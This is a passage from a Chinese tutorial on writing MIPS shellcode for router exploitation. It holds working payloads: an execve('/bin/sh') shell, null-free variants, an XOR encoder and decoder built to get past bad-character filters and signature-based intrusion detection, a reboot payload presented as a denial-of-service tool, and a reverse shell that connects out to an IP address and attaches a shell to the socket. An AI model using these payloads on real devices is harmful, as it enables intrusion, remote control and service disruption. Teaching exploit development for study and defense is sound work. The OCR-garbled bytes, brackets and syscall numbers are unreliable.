第 12 行：4004 是 write 的系统调用号。

接下来，需要将源码 2 编译为链接并执行，以测试代码是否正确。在这里，MIPS 指令汇编编译链接需要使用两条命令，为了避免麻烦，写成如下脚本。

1 #!/bin/sh
2 # $ sh nasm.sh <source file> <excute file>
3 src=$1
4 dst=$2
5 as $src -o s.o
6 ld s.o -o $dst
7 rm s.o
编译并执行源码2，具体如下。
1 root@debian-mips:~# sh nasm.sh write.S write
2 root@debian-mips:~# ./write
3 ABC
4 Illegal instruction

可以看到，编译 write.S 没有错误，第 2 行程序的执行结果是第 3 行和第 4 行（这里已经输出了“$\text{ABC}\backslash\text{n}$”），但是程序执行到了异常的指令）。其实，不用担心第 4 行，因为造成非法指令的原因在于执行完 write 以后，程序没有退出，而是继续执行下面的非法指令，但这对我们的 Shellcode 没有影响。

在完成 write.S 的编译以后，我们需要从编译得来的 write 程序中提取机器码。如果以手工的方式该如何提取呢？

使用命令 “readelf -S write” 查看程序入口地址、入口文件偏移及代码长度。进行 GDB 调试，确定 Shellcode 的长度以便提取。因为 MIPS 是定长指令，每条指令均为 4 字节，所以从汇编代码中也可以推断出 Shellcode 的长度，但为了准确，还是需要用 GDB 查看，如图 7-1 所示。程序 write 的入口地址为 0x00400090，入口在 write 文件中的偏移为 0x90 字节，指令共占据 0x30 字节的空间。

root@debian-tips:~# readelf -S write | more
There are 6 section headers, starting at offset 0xec:
Section Headers:
[Nr] Name Type Addr Off Size ES Flg Lk Inf Al
[0] NULL 00000000 000000 000000 00 0 0 0
[1] .reginfo MIPS REGINFO 00400074 000074 000018 18 A 0 0 4
[2] .text PROGBITS 00400090 000090 000030 00 AX 0 0 16
[3] .shstrtab STRIAB 00000000 0000c0 00002a 00 0 0 1
[4] .symtab SYMTAB 00000000 0001dc 0000b0 10 5 3 4
[5] .strtab STRIAB 00000000 00028c 000039 00 0 0 1
Key to Flags:
W (write), A (alloc), X (execute), M (merge), S (strings)
I (info), L (link order), G (group), T (ILS), E (exclude), x (unknown)
O (extra OS processing required) o (OS specific), p (processor specific)

 </div>

接下来，使用 GDB 调试 write，代码如下。

root@debian-mips:~# gdb write
(gdb) b *0x00400090

Breakpoint 1 at 0x400090
(gdb) r

Starting program: /root/write

Breakpoint 1, 0x00400090 in _ftext()
(gdb) disass /r

Dump of assembler code for function _ftext:
=> 0x00400090 <+0>: 27 bd ff e0 addiu sp, sp,-32
0x00400094 <+4>: 24 04 00 01 li a0,1
0x00400098 <+8>: 3c 0e 41 42 lui t6,0x4142
0x0040009c <+12>: 35 ce 43 0a ori t6,t6,0x430a
0x004000a0 <+16>: af ae 00 00 sw t6,0(sp)
0x004000a4 <+20>: 27 a5 00 00 addiu al,sp,0
0x004000a8 <+24>: 24 06 00 05 li a2,5
0x004000ac <+28>: 24 02 0f a4 li v0,4004
0x004000b0 <+32>: 01 01 01 0c syscall
0x004000b4 <+36>: 00 00 00 00 nop
0x004000b8 <+40>: 00 00 00 00 nop
0x004000bc <+44>: 00 00 00 00 nop

End of assembler dump.

第 2 行：在程序入口 0x00400090 位置下断点。

第 4 行：使用 run 命令运行程序。

第 7 行：使用反汇编命令 “disass /r”。

第9行～第20行：共0x30字节的机器码及汇编代码。

Shellcode 从第 9 行开始，到第 17 行结束，共 36 字节。因此，Shellcode 机器码提取如下。

##### 源码 4 Shellcode 机器码

1 "x27\xbd\xff\xe0" //addiu sp, sp, -32
2 "x24\x04\x00\x01" //li a0,1
3 "x3c\x0e\x41\x42" //lui t6,0x4142
4 "x35\xce\x43\x0a" //ori t6,t6,0x430a
5 "xaf\xae\x00\x00" //sw t6,0(sp)
6 "x27\xa5\x00\x00" //addiu a1,sp,0
7 "x24\x06\x00\x05" //li a2,5
8 "x24\x02\x0f\xa4" //li v0,4004
9 "x01\x01\x01\x0c" //syscall

如下代码可以测试提取的 Shellcode 机器码是否有效。

##### 源码 5 提取的 Shellcode 测试代码（writecode.c）

#include <stdio.h>

char sc[] = {
    "\x27\xbd\xff\xe0" //addiu sp, sp, -32
    "\x24\x04\x00\x01" //li a0, 1
    "\x3c\x0e\x41\x42" //lui t6, 0x4142
    "\x35\xce\x43\x0a" //ori t6, t6, 0x430a
    "\xaf\xae\x00\x00" //sw t6, 0(sp)
    "\x27\xa5\x00\x00" //addiu a1, sp, 0
    "\x24\x06\x00\x05" //li a2, 5
    "\x24\x02\x0f\xa4" //li v0, 4004
    "\x01\x01\x01\x0c" //syscall
);

void main(void)
{
    void (*s)(void);
    printf("sc size %d\\n", sizeof(sc));
    s = sc;
    s();
    printf("[*] work done!\n");
}

编译和执行用于测试的源码 5，具体如下。

root@debian-mips:~# gcc -o writecode writecode.c
root@debian-mips:~# ./writecode

sc size 37

ABC

Illegal instruction

运行后可以看到，Shellcode 成功执行并输出了字符串 “ABC\n”，但是这里仍然输出了第 5 行结果——无效指令。从输出结果看，源码 5 中的第 20 行字符串应该被输出，但实际上没有输出，原因在于我们在调用 “s()” 执行 Shellcode 以后并没有返回 main() 函数，而是继续执行了后续内存中的无效指令，从而导致程序被终止。但是，Shellcode 仍然被完整地执行了。如果想完美地解决问题，可以在 Shellcode 调用 write 后调用 exit，即可正常退出。

#### 7.1.2 execve系统调用

execute Shellcode 是常用的 Shellcode 之一，这种 Shellcode 的目的是让已嵌入 Shellcode 的应用程序运行一个应用程序，如 /bin/sh。Linux 帮助手册对该系统调用的定义如下，其中的 3 个参数分别是将要执行的程序文件、程序执行前需要的参数指针、程序接受的环境变量。

int execve(const char *path, char *const argv[], char *const envp[]);

接下来，我们看看 C 语言中是如何利用 executive 执行 /bin/sh 的，示例如下。

##### 源码 6 C 语言中完整 executive 系统调用代码

#include <stdio.h>
int main()
{
    char *program = "/bin/ls";
    char *arg = -1;
    char *args[3];
    args[0] = program;
    args[1] = arg;
    args[2] = 0;
    execve(program, args, 0);
}

程序执行 “ls -l” 命令，其中执行程序文件为 /bin/ls，命令的参数列表为 “argv[0] = " /bin/ls", argv[1]=" -l", argv[2]="\x00"”。

第 4 行～第 5 行定义了将要执行的程序和程序运行前的参数。

在第 6 行，初始化指向字符串的指针数组；第 5 行～第 9 行用参数列表初始化数组。

在第 10 行，用程序名称、参数指针和指向环境变量的参数列表空指针实现 executive 系统调用。

实际上，在使用 execve 执行 /bin/sh 产生一个 Shell 的过程中，只需要使用如下源码调用 execve 即可。

源码 7 C 语言中的 executive("/bin/sh"...) 代码

#include <stdio.h>
int main()
{
    char *program = "/bin/sh";
    execve(program, 0, 0);
}

因此，可以根据 C 语言的代码调用方式编写执行 /bin/sh 的汇编代码，具体如下。

##### 源码 8 execve 执行/bin/sh 的汇编代码

.section .text
.glob1 start
.set noreorder
start:
li $a2,0x111
p:bltzal $a2,p
li $a2,0
addiu $sp,$sp,-32
addiu $a0,$ra,28
sw $a0,-24($sp)
sw $zero,-20($sp)
addiu $a1,$sp,-24
li $v0,4011
syscall
sc:
.byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68

第 5 行～第 6 行：调用指令执行后会使返回地址并保存到 $ra 寄存器中。因为 MIPS 使用流水线技术，在执行第 6 行指令的同时会执行第 7 行指令，所以这里的下一条指令 $ra 寄存器应该指向第 8 行。

第 7 行：构造了第 2 个参数 0。

第 8 行：分配了 32 字节的内存作为指针数组，以存储参数列表。

第 9 行～第 16 行：/bin/sh 字符串首地址，其首地址计算要从第 6 行跳转中保存的 $ra 算起，即从第 8 行到第 15 行，共偏移 28（4×7）字节。

第 10 行～第 11 行：将参数列表 “\(\arg v[0] = "/bin/sh"” 和 “\arg v[1] = 0"” 存入开辟的指针数组。

第 12 行：获取指针数组地址，作为第二参数存入 $a1。

第 13 行：execve 的系统调用号为 4001。

第 14 行：执行 execve 系统调用。

第 16 行：字符串 “/bin/sh”。

使用如下命令测试源码 8。

1 root@debian-mips:~# sh nasm.sh execve.S execve
2 root@debian-mips:~# ./execve
3 #

可以看到，在第 3 行已经执行 /bin/sh，返回了一个 sh 控制台。

提取完整的 execve，执行 /bin/sh 的机器码的 Shellcode，示例如下。

源码 9 executive 机器码测试 Shellcode

char sc[] = {
    "\x24\x06\x01\x11" //li a2,273
    "\x04\xd0\xff\xff" //bltzal a2,0x400094 <p>
    "\x24\x06\x00\x00" //li a2,0
    "\x27\xbd\xff\xe0" //addiu sp,sp,-32
    "\x27\xe4\x00\x1c" //addiu a0,ra,28
    "\xaf\xa4\xff\xe8" //sw a0,-24(sp)
    "\xaf\xa0\xff\xec" //sw zero,-20(sp)
    "\x27\xa5\xff\xe8" //addiu a1,sp,-24
    "\x24\x02\x0f\xab" //li v0,4011
    "\x01\x01\x01\x0c" //syscall
    "/bin/sh"
};
void main(void)
{
    void (*s)(void);
    printf("sc size %d\\n", sizeof(sc));
    s = sc;
    s();
    printf("[*] work done!\\n");
}

如果需要执行其他命令（如“/bin/ls”），只要将第 12 行的字符串替换为需要执行的程序文件（如“/bin/ls”）即可。注意，在该段 Shellcode 中，虽然可以执行其他命令，但是要执行的程序是不能带有参数的。

本节着重讲解了如何一步一步构造具有特定功能的 Shellcode 并提取机器码，下面简单总结一下。

01 编写 C 语言版本的 Shellcode 程序。

02 收集这段 Shellcode 需要使用的所有系统调用的调用号。

03 根据 C 语言版本的 Shellcode 编写汇编语言，依次构造系统调用。

04 编译链接汇编语言的 Shellcode，测试并提取机器码的 Shellcode。

05 测试提取的 Shellcode 是否能够正常运行。

按照上面的步骤多加练习，便可熟练掌握 Shellcode 的编写方法。但是，上面的 Shellcode 都有一个致命的问题，就是在提取的 Shellcode 机器码中都包含截断字符 “NULL”（\x00）。在缓冲区溢出的利用中，如果造成缓冲区溢出的漏洞函数是 strcpy、strcat 等，函数在复制字符串时都是遇到 “NULL” 则停止复制 “NULL” 字符后面的 Shellcode，如此一来，被复制到缓冲区中的 Shellcode 就是不完整的，因此，虽然这段 Shellcode 在以上测试中能够完美地完成各自的功能，但是在漏洞利用中却可能导致失败。

那么，如何避免这个问题，如何编写更加高效的 Shellcode 呢？这就需要使用高级的技巧了。在 7.2 节中将着重讲解 Shellcode 的高效编码和优化方法。

## 7.2 Shellcode编码优化

在 7.1 节中，我们编写了两段 Shellcode。在很多的漏洞利用现场，Shellcode 的内容将受到坏字符的限制。

什么是坏字符？所有的字符串函数都会对“NULL”字节进行限制。这里的“NULL”就是坏字符中的一种，有时受漏洞程序逻辑影响，换行、空格等字符都有可能成为导致 Shellcode 复制和执行失败的坏字符，因此，需要通过一些特殊的方法去除坏字符。这里介绍两种常用的方法——指令优化和 Shellcode 编码。

#### 7.2.1 指令优化

指令优化是指通过选择一些特殊的指令避免在 Shellcode 中直接生成坏字符。出现坏字符“NULL”字节常用的特殊指令如表 7-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>普通指令</td><td style='text-align: center; word-wrap: break-word;'>机器码</td><td style='text-align: center; word-wrap: break-word;'>无NULL指令</td><td style='text-align: center; word-wrap: break-word;'>机器码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>li $a2,0</td><td style='text-align: center; word-wrap: break-word;'>24 06 00 00</td><td style='text-align: center; word-wrap: break-word;'>slti $a2,$zero,-1</td><td style='text-align: center; word-wrap: break-word;'>28 06 ff ff</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>li $a2,1</td><td style='text-align: center; word-wrap: break-word;'>24 04 00 01</td><td style='text-align: center; word-wrap: break-word;'>sltiu $a0,$zero,-1</td><td style='text-align: center; word-wrap: break-word;'>2c 04 ff ff</td></tr></table>

编写 Shellcode 时要权衡长度及坏字符，当缓冲区大小宽裕时，可以考虑使用多条运算指令规避坏字符（仅举例，实际操作中需要灵活运用），如表 7-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>普通指令</td><td style='text-align: center; word-wrap: break-word;'>机器码</td><td style='text-align: center; word-wrap: break-word;'>无NULL指令序列</td><td style='text-align: center; word-wrap: break-word;'>机器码</td></tr><tr><td rowspan="2">addiu $a0,$ra,32</td><td rowspan="2">24 e4 00 20</td><td style='text-align: center; word-wrap: break-word;'>addiu $a0,$ra,4097</td><td style='text-align: center; word-wrap: break-word;'>27 e4 10 01</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>addiu $a0,$a0,-4065</td><td style='text-align: center; word-wrap: break-word;'>24 84 f0 1f</td></tr><tr><td rowspan="3">Li $a2,5</td><td rowspan="3">24 06 00 05</td><td style='text-align: center; word-wrap: break-word;'>li $t6,-9</td><td style='text-align: center; word-wrap: break-word;'>24 0e ff f7</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>nor $t6,$t6,$zero</td><td style='text-align: center; word-wrap: break-word;'>01 c0 70 27</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>addi $a2,$t6,-3</td><td style='text-align: center; word-wrap: break-word;'>21 c6 ff fd</td></tr></table>

接下来，我们使用以上技巧将之前的 Shellcode 修改如下。

##### 源码 10 无 NULL 的 write 系统调用 Shellcode

char sc[] = {
    "\x2c\x04\xff\xff" //sltiu a0, zero,-1
    "\x3c\x0e\x41\x42" //lui t6,0x4142
    "\x35\xce\x43\x0a" //ori t6,t6,0x430a
    "\xaf\xae\xff\xe8" //sw t6,-24(sp)
    "\xaf\xa0\xff\xec" //sw zero,-20(sp)
    "\x27\xa5\xff\xe8" //addiu al,sp,-24
    "\x24\x0f\xff\xf7" //li t7,-9
    "\x01\xe0\x78\x27" //nor t7,t7,zero
    "\x21\xe6\xff\xfd" //addi a2,t7,-3
    "\x24\x02\x0f\xa4" //li v0,4004
    "\x01\x01\x01\x0c" //syscall
);

第 2 行：使用 sltiu 指令，将数字 1 写入 \$a0，避免出现 “NULL” 字节。

第 8 行～第 10 行：使用 3 条与赋值、运算相关的指令，避免出现 “NULL” 字节，同时实现与运行 “li $a2,5” 命令相同的效果。

##### 源码 11 无 NULL 的 executive 系统调用 Shellcode

char sc[] = {
    "\x24\x06\x01\x01" //li a2,257
    "\x04\xd0\xff\xff" //bltzal a2,0x400094 <p>
    "\x28\x06\xff\xff" //slti a2,zero,-1
    "\x27\xbd\xff\xe0" //addiu sp,sp,-32
    "\x27\xe4\x10\x01" //addiu a0,ra,4097
    "\x24\x84\xf0\x1f" //addiu a0,a0,-4065
    "\xaf\xa4\xff\xe8" //sw a0,-24(sp)
    "\xaf\xa0\xff\xec" //sw zero,-20(sp)
    "\x27\xa5\xff\xe8" //addiu a1,sp,-24
    "\x24\x02\x0f\xab" //li v0,4011
    "\x01\x01\x01\x0c" //syscall
    "/bin/sh"
);

第 2 行～第 3 行：调用指令执行后会将返回地址保存到寄存器 $ra 中。因为 MIPS 使用流水线技术，在执行第 3 行指令的同时会执行第 4 行指令，因此，这里的下一条指令寄存器 $ra 应该指向第 5 行。

第 4 行：使用 “slti” 指令将数字 0 写入寄存器 $a2。

第 6 行～第 7 行：使用两条加法指令实现 “addiu $a0,$ra,32”。$a0 需要的是第 13 行字符串首地址，要注意 “$a0 = $ra+X” 里的 “X” 到底是多少，因为需要通过 “X” 的值确定第 5 行～第 12 行的指令占用多少字节，如这里共占 32（4×8）字节。

经过指令优化的 Shellcode 可以去除坏字符，使 Shellcode 适应字符操作的函数漏洞。

使用一些特殊指令对 Shellcode 进行指令优化以后，可以达到去除坏字符 “NULL” 的目的。但是在漏洞利用的过程中，我们经常会遇到更加苛刻的条件，如需要去除其他坏字符（0x0A、0x0D 等），此时通过特殊指令就很难办到了。应该怎样解决呢？Shellcode 通常使用的方法就是对 Shellcode 进行编码，接下来将详细介绍。

#### 7.2.2 Shellcode编码

在很多的漏洞利用场景中，Shellcode 的内容会受到限制，这种限制不仅来自存在漏洞的软件自身，在某些情况下，也来自一些基于特征的 IDS（网络入侵检测系统）系统。我们先来看看 Shellcode 会受到哪些限制。

首先，所有的字符串函数都会对“NULL”字节进行限制，通常我们会选择对 Shellcode 指令进行优化以避免在 Shellcode 中直接出现“NULL”字节。其次，在某些处理流程中可能会限制 0x0D（\r）、0x0A（\n）或者 0x20（空格）字符。最后，有些函数会要求 Shellcode 必须为可见字符（ASCII 值）或 Unicode 值，有些时候，我们还会受到基于特征的 IDS 系统对 Shellcode 的拦截。

虽然在成功利用漏洞的路上有如此多的阻碍，但对漏洞的利用仍然不是绝对不可能的。目前，我们要想绕过限制字符，可以使用两种方法。

第一种就是前面介绍的通过对 Shellcode 中的指令进行优化。但由于对 Shellcode 中的指令进行优化不仅需要强大的汇编语言基础，在关心程序逻辑和流程的同时，还需要精心挑选合适的指令进行优化，所以，对功能比较复杂的 Shellcode 进行指令优化、避开所有限制字符的过程简直令人崩溃。但幸运的是，我们还有另一种选择——Shellcode 编码技术。

# 1. Shellcode编码原理

在 Shellcode 的编码技术中有众多的编码算法，常用的有如以下几种。

Base64 编码：采用 Base64 对网页 Shellcode 进行编码，可以避免 HTTP 协议传输过程中的字节（如 0x0D、0x0A 等）限制，但是在二进制 Shellcode 中应用难度大。

alpha_upper 编码：编码后整个 Shellcode 呈现 ASCII 可见字符编码，主要用于限制可见字符的环境。解码头的指令需要精心挑选，使解码头指令全部为可见字符，难度大。编码后 Shellcode 字节长度增长较多。

xor 编码：通过异或算法实现编码，编/解码过程容易实现，编码后长度增长可接受。

在上面列举的 3 种编码方式中，后面的 2 种都用于二进制 Shellcode 的编码，它们拥有相同的编码方法，如图 7-2 所示。

这种对 Shellcode 编码的方法和软件加壳的原理类似。我们可以先专心完成 Shellcode 的逻辑，而不用在意 Shellcode 的字节码中是否含有非法字符，再使用编码技术对 Shellcode 进行编码，使其内容满足限制条件。然后，精心构造几十字节的解码程序，将其放在编码的 Shellcode 之前。当 exploit 执行成功时，Shellcode 顶端的解码程序会优先执行，这段解码程序会将编码的 Shellcode 解码成真正的原始 Shellcode，并开始执行它。编码的 Shellcode 在 exploit 执行成功后的解码过程如图 7-3 所示。

通过 Shellcode 编码，我们只需要专注于解码指令，使其符合限制条件就可以了，相对于直接专注于整个 Shellcode 来说，问题要简单很多。下面我们就来实践其中的一种编码方法。

揭秘家用路由器 0day 漏洞挖掘技术

 </div>

 </div>

# 2. 实现Shellcode编码/解码

下面在之前实现的 write 调用的 Shellcode 的基础上，演示如何使用异或编码实现 Shellcode 的编码与解码。

XOR 是指按位异或，其运算规则如下，相同为 0，不同为 1。

0 xor 0 = 0
0 xor 1 = 1
1 xor 0 = 1
1 xor 1 = 0

根据运算规则可以推出，对于某个值 X，密钥 Key，有如下成立等式。

 $$ X\ xor\ Key=Z,\ Z\ xor\ Key=X==>X\ xor\ Key\ xor\ Key=X $$ 

即一个值对同一个数异或运算 2 次后，得到的结果为其原值。我们可以利用该性质实现编码算法 E 和解码算法 D。

编码算法 E：算法很简单。把 Shellcode 数组里的每一个字符 Shellcode，与某一密钥 Key 作异或运算，就得到 Enshellcode（保存在 Enshellcode 数组中）。

解码算法 D: Decode 中要把 Enshellcode 重新变回 Shellcode。根据上面的分析，只需要将 Enshellcode 里面的字符异或编码时的 Key 就可以了，但是解码的过程需要在 exploit 之后执行。因此，需要将解码算法编写成汇编代码并提取指令代码在 Enshellcode 之前运行，将 Enshellcode 解码，最后运行解码后的 Shellcode。

我们通过一个 Python 程序对原始的 Shellcode 进行编码，代码如下。

源码 encoder.py 关于 Shellcode 编码片段

def XOR_ENCODER(shellcode, xor_with):
    data = ''

    for dt in shellcode:
        data += chr(xor_with^ord(dt))
    return bytearray(data)

XOR_ENCODER() 函数会使用传入的 xor_with（1 字节 Key）对 Shellcode 进行逐字节异或运算编码，并将异或编码后的数据（Enshellcode）返回待用。那么，如何产生有效的 xor_with（Key）呢？我们需要获取有效的编码 Key，这需要满足两个条件。

产生的 Key 不能是被限制的字符（user_bad_bytes）。

编码 Key 与 Shellcode 所有字节异或运算的结果不能包含被限制字符（user_bad_bytes）。

源码 encode.py 关于编码 Key 的产生代码片段

1 bad_bytes = [0]*257
2 good_bytes = []
3 def generate_key(shellcode, user_bad_bytes):
4     @ key can't contain in user_bad_bytes
6     @ because key will write in the head of decoder
7     {
    }
8     for dt in shellcode:
9         for i in range(1,256):
10         if i^ord(dt) in user_bad_bytes \
11         or i in user_bad_bytes:
12             bad_bytes[i] = i
13         for i in range(1,256):
14             if bad_bytes[i] == 0:
15             good_bytes.append(i)
16         return random.choice(good_bytes)

产生 Key 的算法思路是初始化 bad_bytes 中的字符为 257 个 0。在 generate_key() 函数中，第 8 行～第 12 行对 Shellcode 的每一个字节与 1～255 进行测试。如果发现异或的结果包含在限制字符（user_bad_bytes）中，或者当前的 Key 本身就属于限制字符，那么将 bad_bytes 相应的位填充 Key 值，表示该位置的值不能作为 Key。在第 13 行～第 15 行代码中，我们遍历整个 bad_bytes 元组，找出所有有效的 Key 存入 good_bytes。第 16 行使用随机函数从有效 Key 中选择一个作为 xor_with 返回。

接下来就是解码指令头了，代码如下。

.section .text
.global start
.set noreorder
start:
li $t8,-0x666
p:bltzal $t8,p
slti $t8,$zero,-1
addu $t0,$ra,4097
addu $t0,$t0,4097
lui $t1,0x9d9d
ori $t1,$t1,0x9d9d
lui $t3,0x01e0
ori $t3,$t3,7827
x:lw $t6,-1($t0)

15 xor $t4,$t6,$t1
16 sw $t4, -1($t0)
17 addu $t0, $t0, -4
18 bne $t6, $t3, x
19 nor $t7, $t7, $zero

第 9 行：这里的 4097 应该是 “addu $t0, $t0, -4097+44+len+1” 的计算结果。

第 10 行～第 11 行：其中的所有 “0x9d” 也要修改为 generate_key() 函数生成的 Key。

经过 lui 和 ori 指令以后 Key 变成 4 字节，以这里为例，其值为 0x9d9d9d9d。

第 14 行～第 18 行：从编码后的 Shellcode 末尾循环取 4 字节，然后与 Key 进行异或操作以完成解码操作，直到完成整个 Shellcode 解码。

了解了如何编码 Shellcode 为 Enshellcode，以及如何解码指令头以后，我们只需要将编码后的 Shellcode（Enshellcode）附加在解码头数据之后，就形成了最终可以避免限制字符的 Shellcode。这里通过一个程序将整个编码 Shellcode 的过程自动实现，并输出不包含限制字符的 Shellcode，详细代码参考本书提供的下载链接。

最终生成的 Shellcode 如下面代码中定义的字符数组 sc 所示。这里还需要测试 Shellcode，可以使用如下代码在 MIPS 虚拟机中进行测试。

源码 Shellcode 测试代码

#include <stdio.h>
#MIPS big-endian
char sc[] =
\\x24\x18\xf9\x9a
\\x07\x10\xff\xff
\\x28\x18\xff\xff
\\x27\xe8\x10\x01
\\x25\x08\xf0\x58
\\x3c\x09\x89\x89
\\x35\x29\x89\x89
\\x3c\x0b\x01\xe0
\\x35\x6b\x78\x27
\\x8d\x0e\xff\xff
\\x01\xc9\x60\x26
\\xad\x0c\xff\xff
\\x25\x08\xff\xff
\\x15\xcb\xff\xff
\\x01\xe0\x78\x27
\\xad\x8f\x8f\xef
\\x8d\x59\x76\x76
\\xae\x34\x76\x69

揭现家用给田器 0day 漏洞挖掘技术

22 "xad\x8d\x89\x88"
23 "xb5\x87\xc8\xcb"
24 "xbc\x47\xca\x83"
25 "x26\x27\x89\x89"
26 "xae\x2c\x89\x89"
27 "xad\x8f\x89\x8c"
28 "xad\x8b\x86\x2d"
29 "x88\x88\x88\x85";
30 void main(void)
31 {
32 void (*s)(void);
33 printf("size:%d\\n",sizeof(sc));
34 s = sc;
35 s();
36 }
编译运行之后，输出结果如下。
1 root@debian-mips:~/testshell# ./shellloader
2 size:105
3 ABC
4 Illegal instruction

上面介绍了一种简单的异或编码 Shellcode 的过程，用于演示我们在实际使用中开发 Shellcode 编码器、解码器的原理和方法。实际上，还有一些比较好的编码方法，如 long_xor 方式使用 4 字节为编码块的分组编码方式。如果读者对其他编码器感兴趣，可以参考 Metasploit 提供的编码和解码算法。

## 7.3 通用Shellcode开发

本节介绍一些通用的 Shellcode 开发方法。

#### 7.3.1 reboot Shellcode

执行重启的 Shellcode 也经常应用于远程程序的漏洞利用。我们可以利用重启路由器造成拒绝服务。

在测试时要小心，这个 Shellcode 可能使机器重启，因此要注意保存信息。

首先看一下使用 C 语言应该如何编写 reboot 程序。

##### 源码 12 C 语言 reboot

1 int main()
2 {
3 reboot (0xfeeldead, 0x28121969, 0x4321FEDC);
4 }

根据 Linux 帮助手册，关于 reboot 系统调用的定义如下。

int reboot(int magic, int magic2, int cmd);

关于参数，可以在 Linux 源码目录 /usr/include/linux/reboot.h 中找到如下定义。

root@debian-tips:~# cat /usr/include/linux/reboot.h | grep LINUX_REBOOT
#ifndef _LINUX_REBOOT_H
#define _LINUX_REBOOT_H
#define LINUX_REBOOT_MAGIC1 0xfeeldead
#define LINUX_REBOOT_MAGIC2 672274793
#define LINUX_REBOOT_MAGIC2A 85072278
#define LINUX_REBOOT_MAGIC2B 369367448
#define LINUX_REBOOT_MAGIC2C 537993216
#define LINUX_REBOOT_CMD_RESTART 0x01234567
#define LINUX_REBOOT_CMD_HALT 0xCDEF0123
#define LINUX_REBOOT_CMD_CAD_ON 0x89ABCDEF
#define LINUX_REBOOT_CMD_CAD_OFF 0x00000000
#define LINUX_REBOOT_CMD_POWER_OFF 0x4321FEDC
#define LINUX_REBOOT_CMD_RESTART2 0xA1B2C3D4
#define LINUX_REBOOT_CMD_SW_SUSPEND 0xD000FCE2
#define LINUX_REBOOT_CMD_KEXEC 0x45584543
#endif /* LINUX_REBOOT_H */

按照 C 语言编写的 reboot，可以编写汇编语言的 Shellcode 如下。

##### 源码 13 汇编语言的 reboot

1 .section .text
2 .glob1 start
3 .set noreorder
4 start:
5 lui $a2,0x4321
6 ori $a2,$a2,0xfedc
7 lui $a1,0x2812
8 ori $a1,$a1,0x1969
9 lui $a0,0xfeel

揭秘用路由器 0day 漏洞挖掘技术
10 ori $a0, $a0, 0xdead
11 li $v0, 4088
12 syscall

根据汇编语言提取的最终的 Shellcode 机器码如下。

源码 14 reboot Shellcode 机器码

1 "x3c\x06\x43\x21" #lui a2,0x4321
2 "x34\xc6\xfe\xdc" #ori a2,a2,0xfedc
3 "x3c\x05\x28\x12" #lui a1,0x2812
4 "x34\xa5\x19\x69" #ori a1,a1,0x1969
5 "x3c\x04\xfe\جد" #lui a0,0xfeel
6 "x34\x84\xde\xad" #ori a0,a0,0xdead
7 "x24\x02\x0f\xf8" #li v0,4088
8 "x01\x01\x01\x0c" #syscall

#### 7.3.2 reverse_tcp Shellcode

反向连接 Shellcode 可以在一个被攻击系统和另一个系统之间建立连接，一旦 Shellcode 被连接，将产生一个交互式的 Shellcode。Shellcode 可以从被攻击机器上产生一个指向外部的连接，这对于攻击躲避在防火墙后面的服务器中的漏洞是很有用的。

C 语言实现反向连接 Shellcode 的代码如下。

##### 源码 15 C 语言实现反向连接远程端口

int soc,rc;
struct sockaddr_in_serv_addr;
//reverse(ip:port):192.168.2.73:30583
int main()
{
    serv_addr.sin_family=AF_INET;
    serv_addr.sin_addr.s_addr=0xc0a80249;
    serv_addr.sin_port=0x7777;
    soc=socket(AF_INET,SOCK_STREAM,0);
    rc=connect(soc, (struct sockaddr*)&serv_addr,0x10);
    dup2(soc,0);
    dup2(soc,1);
    dup2(soc,2);
    execve("/bin/sh",0,0);
}

为了实现反向连接，需要成功执行 socket（第 9 行）、connect（第 10 行）、dup2（第 11 行～第 13 行）和 execve（第 14 行）系统调用。

这里的 Socket 调用并不难，所有的参数都是整数，不存在指针等复杂的类型，需要注意的就是把 Socket 的返回值放在安全的地方，因为在 connect 和 dup2 中会使用这个值。在本例中，AF_INET=2，SOCK_STREAM=2。

建立 Socket 以后，需要尝试连接远程主机，将主机的端口和 IP 配置信息保存在 serv_addr 中。

连接好以后，会得到一个套接字文件描述符，这个套接字文件描述符允许用户与套接字接口进行通信。因为我们想要给连接的用户返回一个交互式的 Shell，所以使用套接字来复制 stdin、stdout、stderr 并执行 Shell（第 11 行～第 13 行）。又因为 stdin、stdout、stderr 被复制到套接字，所以所有发送给 Socket 的信息页都会发送给 Shell，而所有由 Shell 发送给 stdin、stdout、stderr 的内容也会发送给套接字。

这是一个在 Shellcode 中执行多个系统调用的例子，各个调用之间的关系比较复杂，下面把每个系统调用分开讲解。

##### 源码 16 Socket 系统调用

sys_socket
# a0: domain
# al: type
# a2: protocol
li $t7,-6
nor $t7,$t7,$zero
addi $a0,$t7,-3
addi $a1,$t7,-3
slti $a2,$zero,-1
li $v0,4183 # sys_socket
11 syscall

第 5 行～第 8 行：利用指令优化 Socket 的第 1 个参数 $a0 被赋值为 2，同时，Socket 的第 2 个参数 $a1 也被赋值为 2。

第 9 行：Socket 的第 3 个参数被赋值为 0。

第 10 行～第 11 行：调用执行 socket(2,2,0) 函数。

##### 源码 17 connect 系统调用

1 # sys_connect
2 # a0: sockfd (stored on the stack)
3 # a1: addr (data stored on the stack)

4 # a2: addrlen
5 sw $v0,-1($sp)
6 lw $a0,-1($sp)
7 li $t7,0xfffd
8 nor $t7,$t7,$zero
9 sw $t7,-32($sp)
10 lui $t6,0x7777 #port
11 ori $t6,$t6,0x7777
12 sw $t6,-28($sp)
13 lui $t6,0xc0a8 #ip(high)
14 ori $t6,$t6,0x0249 #ip(low)
15 sw $t6,-26($sp)
16 addiu $al,$sp,-30
17 li $t4,-17
18 nor $a2,$t4,$zero
19 li $v0,4170 # sys_connect
20 syscall

第 5 行：将 Socket 返回的套接字文件描述符 $v0 保存到 $sp-1 中，在第 6 行将文件描述符赋给 connect 的第 1 个参数 $a0。

第 6 行～第 9 行：构造  $  \text{serv\_addr.sin\_family}  $ 参数。这里先将 4 字节的 0x00000002 写入 \sp-32，但因为  $  \sin_{family}  $ 是 2 字节，所以最终的结构体首地址从 \sp-30 开始。

第 10 行～第 12 行：向 $sp-28 写入 0x777777777，其实这里的端口值已经覆盖了 IP 地址域。

